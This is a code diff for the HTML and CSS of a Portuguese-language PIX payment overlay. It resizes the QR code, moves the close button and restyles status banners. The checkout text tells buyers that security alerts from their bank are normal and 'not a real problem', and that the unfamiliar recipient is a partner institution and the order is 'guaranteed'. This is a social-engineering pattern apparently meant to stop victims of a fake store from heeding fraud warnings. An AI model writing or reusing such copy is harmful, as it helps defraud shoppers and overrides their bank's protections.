@@ -195,6 +195,7 @@
     .pix-sheet {
       background: #f4f4f4; border-radius: 22px 22px 0 0;
       max-height: 92vh; display: flex; flex-direction: column;
+      position: relative;
     }
     .pix-sheet.pix-opening { animation: slideUpModal .32s cubic-bezier(.25,.46,.45,.94); }
     .pix-sheet.pix-closing { animation: slideDownSheet .25s cubic-bezier(.55,.06,.68,.19) forwards; }
@@ -211,7 +212,7 @@
     .pix-card { background: #fff; border-radius: 14px; padding: 18px 16px; margin-bottom: 12px; box-shadow: 0 1px 5px rgba(0,0,0,.07); }
     .px-qr-wrap { display: flex; flex-direction: column; align-items: center; gap: 0; margin-bottom: 8px; position: relative; }
     .px-qr-skel {
-      width: 200px; height: 200px; border-radius: 12px; border: 2px solid #eee;
+      width: 160px; height: 160px; border-radius: 12px; border: 2px solid #eee;
       background: #f0f0f0; position: relative; overflow: hidden; flex-shrink: 0;
     }
     .px-qr-skel::after {
@@ -221,7 +222,7 @@
     }
     @keyframes imgShimmer { 0%{background-position:-200% 0} 100%{background-position:200% 0} }
     .px-qr-img {
-      width: 200px; height: 200px; border-radius: 12px; border: 2px solid #eee;
+      width: 160px; height: 160px; border-radius: 12px; border: 2px solid #eee;
       object-fit: contain; opacity: 0; transition: opacity .25s ease;
       position: absolute; top: 0; left: 0;
     }
@@ -377,27 +378,29 @@
   <!-- ══ OVERLAY PIX ══ -->
   <div class="pix-overlay" id="pix-overlay" style="display:none" onclick="fecharPixOverlay()">
     <div class="pix-sheet" id="pix-sheet" onclick="event.stopPropagation()">
+      <button class="pix-top-close" onclick="fecharPixOverlay()" style="position:absolute;top:10px;right:14px;background:none;border:none;font-size:20px;color:#888;cursor:pointer;z-index:10;line-height:1;padding:4px;"><i class="fa fa-times"></i></button>
       <div class="pix-sheet-header">
         <div class="pix-handle-wrap"><div class="pix-handle"></div></div>
-        <div class="pix-top-row">
-          <button class="pix-top-close" onclick="fecharPixOverlay()"><i class="fa fa-times"></i></button>
+      </div>
+      <div style="background:#e8f7ee;border-bottom:1.5px solid #b8eac7;padding:14px 44px 12px 16px;display:flex;align-items:center;gap:10px;flex-shrink:0;">
+        <span style="color:#077c22;font-size:16px;flex-shrink:0;">✅</span>
+        <div>
+          <div style="font-size:13px;font-weight:700;color:#155724;line-height:1.3;">Pedido reservado</div>
+          <div style="font-size:11.5px;color:#1a6630;margin-top:2px;">Aguardando confirmação do pagamento.</div>
         </div>
       </div>
       <div class="pix-content">
 
         <div class="pix-card">
 
-          <!-- Recebedor — prepara o cliente antes de abrir o banco -->
-          <div style="background:#f0faf3;border:1px solid #b8eac7;border-radius:10px;padding:9px 12px;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
-            <span style="color:#077c22;font-size:14px;flex-shrink:0;">✅</span>
-            <div style="font-size:12px;color:#1a4a2a;line-height:1.4;font-weight:600;">Pedido reservado — aguardando confirmação do pagamento.</div>
-          </div>
-
-          <div style="background:#fff8e1;border:1px solid #ffe066;border-radius:10px;padding:9px 12px;margin-bottom:12px;display:flex;align-items:flex-start;gap:8px;">
-            <span style="font-size:13px;flex-shrink:0;">⚠️</span>
+          <div style="background:#fff8e1;border:1px solid #ffe066;border-radius:10px;padding:9px 12px;margin-bottom:6px;display:flex;align-items:flex-start;gap:8px;">
+            <span style="font-size:13px;flex-shrink:0;margin-top:1px;">⚠️</span>
             <div style="font-size:11.5px;color:#5a4000;line-height:1.5;">
-              Alguns bancos exibem alertas de segurança automáticos. Isso é normal em compras online e não representa problema real. O recebedor é nossa instituição de pagamentos parceira e seu pedido está seguro e garantido. ✅
+              Alguns bancos exibem alertas de segurança automáticos. Isso é normal em compras online e não representa problema real.
             </div>
+          </div>
+          <div style="font-size:11px;color:#666;text-align:center;margin-bottom:12px;line-height:1.5;">
+            O recebedor é nossa instituição de pagamentos parceira.<br>Seu pedido está seguro e garantido. ✅
           </div>
 
           <div class="px-qr-wrap">
